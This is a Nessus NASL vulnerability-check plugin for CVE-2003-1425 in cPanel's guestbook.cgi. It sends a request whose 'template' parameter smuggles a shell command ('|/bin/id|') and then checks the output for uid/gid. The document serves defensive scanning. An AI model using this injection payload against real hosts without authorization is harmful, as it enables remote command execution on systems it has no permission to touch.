#
# (C) Tenable Network Security, Inc.
#

# *untested*
#
# Message-ID: <3E530C7A.9020608@scan-associates.net>
# From: pokleyzz <pokleyzz@scan-associates.net>
# To: bugtraq@securityfocus.org
# Subject: Cpanel 5 and below remote command execution and local root
#           vulnerabilities
# 


include("compat.inc");

if(description)
{
 script_id(11281);
 script_version ("$Revision: 1.22 $");

 script_cve_id("CVE-2003-1425");
 script_bugtraq_id(6882);
 script_osvdb_id(4220);
 
 script_name(english:"cPanel guestbook.cgi template Parameter Arbitrary Command Execution");
 script_summary(english:"Executes /bin/id");

 script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host has a command execution
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of cPanel running on the remote host does not properly
filter input to the 'template' parameter of '/guestbook.cgi'.  This
could allow a remote attacker to execute arbitrary commands with the
privileges of the web server." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2003/Feb/281"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/vulnwatch/2003/q1/87"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to cPanel 6.0 or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/02/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/02/19");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


cmd[0] = "/usr/bin/id";
cmd[1] = "/bin/id";

port = get_http_port(default:80);

for (i=0; i<2; i++)
{
http_check_remote_code (
			unique_dir:"/cgi-sys",
			check_request:"/guestbook.cgi?user=cpanel&template=|" + cmd[i] + "|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
}
